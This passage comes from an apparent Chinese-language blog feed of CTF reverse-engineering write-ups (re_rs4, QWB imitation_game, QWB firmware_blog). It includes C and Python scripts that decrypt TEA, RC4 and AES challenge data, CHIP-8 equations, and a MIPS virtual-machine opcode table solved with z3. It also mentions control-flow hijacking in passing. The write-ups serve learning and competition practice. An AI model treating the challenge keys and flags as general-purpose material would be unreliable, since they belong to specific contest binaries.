Frame上的数据，这样就成功劫持了程序的控制流。后续的话就是动调分析代码了，这里不再详细阐述了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">void tea_decrypt(uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0 &#x3D; v[0], v1 &#x3D; v[1], sum, i;</span><br><span class="line">    uint32_t delta &#x3D; 0x9e3779b9;</span><br><span class="line">    sum &#x3D; delta &lt;&lt; 5;</span><br><span class="line">    uint32_t k0 &#x3D; k[0], k1 &#x3D; k[1], k2 &#x3D; k[2], k3 &#x3D; k[3];</span><br><span class="line">    for (i &#x3D; 0; i&lt;32; i++) &#123;</span><br><span class="line">        v0 -&#x3D; ((v1 &lt;&lt; 4) + k2) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k3);</span><br><span class="line">        v1 -&#x3D; ((v0 &lt;&lt; 4) + k0) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k1);</span><br><span class="line">        sum -&#x3D; delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[0] &#x3D; v0; v[1] &#x3D; v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Xor(unsigned int v, uint8_t* k)</span><br><span class="line">&#123;</span><br><span class="line">    int v0 &#x3D; v % 256;</span><br><span class="line">    int v1 &#x3D; (v &gt;&gt; 8) % 256;</span><br><span class="line">    int v2 &#x3D; (v &gt;&gt; 16) % 256;</span><br><span class="line">    int v3 &#x3D; (v &gt;&gt; 24);</span><br><span class="line">    k[0] ^&#x3D; v0;</span><br><span class="line">    k[1] ^&#x3D; v1;</span><br><span class="line">    k[2] ^&#x3D; v2;</span><br><span class="line">    k[3] ^&#x3D; v3;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int tea_key[4] &#x3D; &#123; 0x79757361,0x79796473,0xDEADBEEF,0xAA114514 &#125;;  &#x2F;&#x2F;解密tea算法的4个key</span><br><span class="line"></span><br><span class="line">    unsigned int c[4] &#x3D; &#123; 0x189BE35C, 0x1109831A, 0x3E530874, 0x4B8898EB&#125;;  &#x2F;&#x2F;密文</span><br><span class="line">        &#x2F;&#x2F; c为要加密的数据是两个32位无符号整数</span><br><span class="line">        &#x2F;&#x2F; k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br><span class="line">        &#x2F;&#x2F;printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">        &#x2F;&#x2F;encrypt(v, k);</span><br><span class="line">        &#x2F;&#x2F;printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    unsigned char rc4_key[] &#x3D; &#123; 0x60,0xCF,0xB4,0xE7,0x52,0x33,0x98,0xE6,0xC0,0xB5,0x1D,0x8,0x8A,0xE2,0x5E,0x86 &#125;; &#x2F;&#x2F;rc4的密钥</span><br><span class="line">    tea_decrypt(&amp;c[0], tea_key);</span><br><span class="line">    tea_decrypt(&amp;c[2], tea_key);</span><br><span class="line">    for (int i &#x3D; 0; i &lt; 4; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Xor(c[i], &amp;rc4_key[i * 4]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;flag:\n&quot;);</span><br><span class="line">    for (int i &#x3D; 0; i&lt;16; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%2x&quot;, rc4_key[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这道题感觉都被人做烂了，我也是赛后才做出来，实在是太菜了。&lt;/p&gt;
&lt;p&gt;简单说说这题吧，流程其实就是一个RC4和一个魔改TEA加密，RC4可以通过对IDA中未定义的函数段重新定义后就能看出来。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/10/19/flow/image</summary>
      
    
    
    
    <category term="linux-reverse" scheme="http://yoursite.com/categories/linux-reverse/"/>
    
    
    <category term="TEA" scheme="http://yoursite.com/tags/TEA/"/>
    
    <category term="RC4" scheme="http://yoursite.com/tags/RC4/"/>
    
    <category term="SROP" scheme="http://yoursite.com/tags/SROP/"/>
    
  </entry>
  
  <entry>
    <title>re_rs4</title>
    <link href="http://yoursite.com/2020/10/15/re-rs4/"/>
    <id>http://yoursite.com/2020/10/15/re-rs4/</id>
    <published>2020-10-15T08:39:12.494Z</published>
    <updated>2020-10-15T08:58:59.457Z</updated>
    
    <content type="html"><![CDATA[<p>第一次参加国赛决赛，不得不说比赛保障真的很到位，但比赛平台着实拉跨，第一天的AWD完全乱搞，好奇的话可以去看下知乎的评价。比赛第二天又改为解题赛了，本想着re作为混子到线下顶多修补pwn题，但这回带来的电脑没有工具，所以坑队友了。</p><p>先说说这次比赛的题目吧，一道是re_rs4一个图形加解密题，一道是re_babyriscv一个是riscv架构的逆向题，riscv至今也没研究出来，先说说re_rs4吧。这道题里面有plt.sec，导致好多函数看起来十分复杂，而且不论静态还是动态都找不到一处最后结果判断的地方。而且题目给你的只有一个output文件，在IDA中又会莫名其妙的看见一个secret文件，唯一有线索的地方是通过findcrypt找到TEA算法。后面就动态调试看看。</p><p><img src="/2020/10/15/re-rs4/image-20201015102430692.png" alt="image-20201015102430692"></p><p>要进入if判断首先得在你的当前目录下有一个secret.jpg，并且在执行程序时必须将该程作为参数带入执行，然后在sub_1FE8A函数下有</p><p><img src="/2020/10/15/re-rs4/image-20201015150410958.png" alt="image-20201015150410958"></p><p>这个循环就是一个一个字节读入你的secret.jpg内容，再进入到sub_1F3B5，里面有一个大循环，进入大循环后大概就是将secret.jpg内容中看成是一个DWORD数组，然后对你的每个DWORD下标做一个判断，然后将每两个DWORD做小端处理，作为TEA加密的明文，密钥就是你输入的16字节，根据TEA加密形式，它有一个4个DWORD的密钥，这就是你的输入，在main函数中有一个专门的函数他会做一个小端的转化处理</p><p><img src="/2020/10/15/re-rs4/image-20201015164217812.png" alt="image-20201015164217812"></p><p>然后会将secret.jpg内容中每两个DWORD大小的内容作为TEA加密的明文</p><p><img src="/2020/10/15/re-rs4/image-20201015165047101.png" alt="image-20201015165047101"></p><p>最后就是将你的加密内容输出到output.jpg文件，虽然题目中没有一个明显的比较和判断，但通过正向分析慢慢的理解程序流程，其实难度就在于函数过多且比赛现场没有公网查资料也很难，最后的exp就是一个爆破密钥的过程。但由于key是一个长度为4的DWORD数组，爆破必然费时，所以可以先尝试单字节爆破，假设每个DWORD其实只有一个字节大小。这样最后居然可以爆破成功。最后由于参考了别人的exp就不展示了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;第一次参加国赛决赛，不得不说比赛保障真的很到位，但比赛平台着实拉跨，第一天的AWD完全乱搞，好奇的话可以去看下知乎的评价。比赛第二天又改为解题赛了，本想着re作为混子到线下顶多修补pwn题，但这回带来的电脑没有工具，所以坑队友了。&lt;/p&gt;
&lt;p&gt;先说说这次比赛的题目吧，一道</summary>
      
    
    
    
    <category term="linux-reverse" scheme="http://yoursite.com/categories/linux-reverse/"/>
    
    
    <category term="TEA" scheme="http://yoursite.com/tags/TEA/"/>
    
  </entry>
  
  <entry>
    <title>QWB-imitation_game</title>
    <link href="http://yoursite.com/2020/09/08/QWB-re3/"/>
    <id>http://yoursite.com/2020/09/08/QWB-re3/</id>
    <published>2020-09-08T06:50:20.681Z</published>
    <updated>2020-09-08T08:20:17.652Z</updated>
    
    <content type="html"><![CDATA[<p>​    放入IDA后看下string发现存在”Your flag: flag{input1+input2}“字符串，因此可以判断会存在两层输入，用gdb调试下去发现有个cmp edi，2总是过不去，后面发现题目还给了个bin文件因此猜测是作为命令行参数读入，然后就会通过了，继续单步下去会发现fork了一个子进程，然后会ptrace一下，然后会把你的输入填充0x1a补成64字节，又会给你两串16字节的数，越来越有点标准加密的味道了，再更具会发现一个256的表，一查果然是AES的表，再根据给的两串数，猜测是AES,CBC模式加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key=<span class="string">b&quot;\x3e\x2c\x25\x13\x18\xbe\xc3\x6b\xa1\x37\x24\x53\x03\x1e\x51\xec&quot;</span></span><br><span class="line">iv=<span class="string">b&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f&quot;</span></span><br><span class="line">enc=<span class="string">b&quot;\x9d&#123;\xa2&lt;\xb1\t\x9aHA\xd1fc\xd6\xae&lt;\xab@\x89\x92\xf3R\xb2\x11\x16\xf5\xea~\x97\xb7\x1c\x011\xe8\x19\x01\x8b+\x91\xbe&amp;2k\xd4%0\\\xc2\x87&quot;</span></span><br><span class="line"><span class="comment">#enc=b&quot;\x35\x24\x66\xbf\xf5\x59\x11\x95\xd0\x0e\xf4\x95\x58\x2c\x2f\xd1\x5d\x58\x22\xe9\x5f\x7f\xaa\x84\x6e\x00\xc2\x1c\x43\x55\xe9\xf3\x91\xfd\x02\x40\x63\x55\xf0\x50\x8a\xb6\xd1\xa5\x28\xfa\x3e\x2c\xd9\x36\xc2\xbb\xc8\x27\xa9\xe8\xc2\x4e\x37\xd7\x6c\x84\xa4\x8f&quot;</span></span><br><span class="line">aes=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line"><span class="keyword">print</span> (aes.decrypt(enc))</span><br><span class="line"><span class="string">b&#x27;6c8f1d78770fe672122478c6f9a150e4\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a&#x27;</span></span><br></pre></td></tr></table></figure><p>继续用gdb单步下去就会触发异常，执行不到第二层。这时突然想起之前gdb调试不是fork了一个子进程，但返回一个空的进程号，在gdb里用show follow-fork-mode查看一下发现调试的就是子进程，因此切换成主进程set follow-fork-mode parent，这次再重新调试发现直接进入到第二层了，第二层会读入game.bin文件内容，然后启动一个窗口有点像bochs，会让你输入十个数不对的话会出现dead。</p><p><img src="/2020/09/08/QWB-re3/image-20200908155518934.png" alt="image-20200908155518934"></p><p>后面题目放了提示chip-8，一查资料原来是一个模拟器，有它自己专门汇编语言，在GitHub上也有专门的反编译器。反编译出来的效果如图</p><p><img src="/2020/09/08/QWB-re3/image-20200908155601343.png" alt="image-20200908155601343"></p><p>在维基百科上有所有CHIP8指令含义，他有一个专门的getkey()指令作为从缓冲区读入的接口，从这里开始分析，并结合调试逆向分析，模拟器会把你输入的10个数依次放入V0-V9是个寄存器中，然后每个数会做一个加减亦或运算，然后就是调用0x027a（会传两个参数一个是你输入的数，另一个程序给的），这其实是一个乘法运算，把运算式列出来其实就是10个多元一次方程。方程式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">V0 &#x3D; V0 + 2</span><br><span class="line">V1 &#x3D; V1 + 1</span><br><span class="line">V2 &#x3D; (V2 + 1) ^ 1</span><br><span class="line">V3 &#x3D; V3 + 3</span><br><span class="line">V4 &#x3D; V2 + 2</span><br><span class="line">V5 &#x3D; (V5^2) + 1</span><br><span class="line">V6 &#x3D; V6 + V6</span><br><span class="line">V7 &#x3D; V7 + 1</span><br><span class="line">V8 &#x3D; (V8 ^ 1) + 1</span><br><span class="line">V9 &#x3D; V9 + 2</span><br><span class="line">V0+V1*2+V2&#x3D;&#x3D;33</span><br><span class="line">V0*2+V1+V2&#x3D;&#x3D;42</span><br><span class="line">V0+2*V1+2*V2&#x3D;&#x3D;48</span><br><span class="line">V3+2*V4+V5&#x3D;&#x3D;55</span><br><span class="line">2*V3+V4+V5&#x3D;&#x3D;55</span><br><span class="line">V3+2*V4+2*V5&#x3D;&#x3D;59</span><br><span class="line">V6+2*V7+V8&#x3D;&#x3D;31</span><br><span class="line">2*V6+V7+V8&#x3D;&#x3D;22</span><br><span class="line">V6+V7*2+V8*2&#x3D;&#x3D;32</span><br><span class="line">V9&#x3D;&#x3D;5</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    放入IDA后看下string发现存在”Your flag: flag{input1+input2}“字符串，因此可以判断会存在两层输入，用gdb调试下去发现有个cmp edi，2总是过不去，后面发现题目还给了个bin文件因此猜测是作为命令行参数读入，然后就会通过了</summary>
      
    
    
    
    <category term="linux-reverse" scheme="http://yoursite.com/categories/linux-reverse/"/>
    
    
    <category term="AES" scheme="http://yoursite.com/tags/AES/"/>
    
    <category term="Chip8" scheme="http://yoursite.com/tags/Chip8/"/>
    
    <category term="fork" scheme="http://yoursite.com/tags/fork/"/>
    
  </entry>
  
  <entry>
    <title>QWB-firmware_blog</title>
    <link href="http://yoursite.com/2020/09/06/QWB-re2/"/>
    <id>http://yoursite.com/2020/09/06/QWB-re2/</id>
    <published>2020-09-06T11:08:19.993Z</published>
    <updated>2020-09-07T03:26:15.815Z</updated>
    
    <content type="html"><![CDATA[<p>这是个32位MIPS架构的虚拟机题，opcode总共有1660个量十分大，而且程序也有688K，调试起来也是十分需要考验耐心的，但虚拟机始终是虚拟机只要找到关键位置后其实分析起来还是比较简单的。所有的opcode都集中在0x4b2020处，根据程序运行出现的“&gt;”的符号也能很快定位D到关键函数0x400620，你的输入会替换到原始opcode中0xff数，开始时小编用的是qemu + gdb-multiarch进行调试，但这种调试方法麻烦之处在于没有步过命令，不论是n还是s命令都会很容易进入到一些无用函数内部，所以每次都是采取下断的方式步过一些无用函数。后面采用的的是qemu + IDA的方式就解决了这个问题。先说opcode的组成吧，它是每四个为一组，第一个数代表操作指令，运算指令总共有put，+，-，*，^，cmp四种，第二个数代表处理结果存放的位置，第三个数存放的是目标操作数或目标操作数位置(根据具体指令情况而定)，题目初始化一个三元数组array，array[0]放置的是input，array[1]和array[2]存放的一般是操作数。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    0x34:put</span><br><span class="line">    0x3b:+</span><br><span class="line">    0x6e:^</span><br><span class="line">    0x3d:-</span><br><span class="line">    0x3a:*</span><br><span class="line">    0x4f:cmp</span><br><span class="line">&#125;</span><br><span class="line">[0x34, 0x01, 0x02, 0x00]:</span><br><span class="line">mov arry[1] 2</span><br><span class="line">[0x6E, 0x00, 0x01, 0x00]:</span><br><span class="line">xor array[0] array[1]</span><br><span class="line">[0x4F, 0x00, 0x00, 0x00]:</span><br><span class="line">cmp array[0] 0</span><br><span class="line">[0x3D, 0x00, 0x01, 0x00]:</span><br><span class="line">sub array[0] array[1]</span><br><span class="line">[0x3B, 0x00, 0x01, 0x00]:</span><br><span class="line">add array[0] array[1]</span><br><span class="line">[0x3A, 0x00, 0x01, 0x00]:</span><br><span class="line">mul array[0] array[1]</span><br></pre></td></tr></table></figure><p>小编在开始调试时会发现读取的输入会莫名奇妙的消失，它也并未执行类似存放在某个地址空间语句，后来发现是因为mips架构具有延迟分支的特性，当跳转/分支指令到达执行阶段并且新的程序计数器已经产生时，紧随其后的下一条指令已经开始执行了。例如下图中在执行jr指令的同时会把a1寄存器中的内容存放至v0[4]所对应的地址空间中，其实就是array数组中的地址。</p><p><img src="/2020/09/06/QWB-re2/image-20200907105442752.png" alt="image-20200907105442752"></p><p>后续的话就是跟踪这个地址，但发现IDA在调试mips架构程序时硬件断点和内存断点都触发不了，因此就是漫长的调试找关键语句。这里小编直接将关键语句的地址以及执行的语句粘贴出来。避免大家在调试过程中浪费太多时间。</p><p><img src="/2020/09/06/QWB-re2/image-20200907110125117.png" alt="image-20200907110125117"></p><p><img src="/2020/09/06/QWB-re2/image-20200907110213063.png" alt="image-20200907110213063"></p><p><img src="/2020/09/06/QWB-re2/image-20200907110251527.png" alt="image-20200907110251527"></p><p><img src="/2020/09/06/QWB-re2/image-20200907110321410.png" alt="image-20200907110321410"></p><p>了解过程后就是翻译opcode解题了，用的是z3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">code=[</span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x8C</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x4E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span 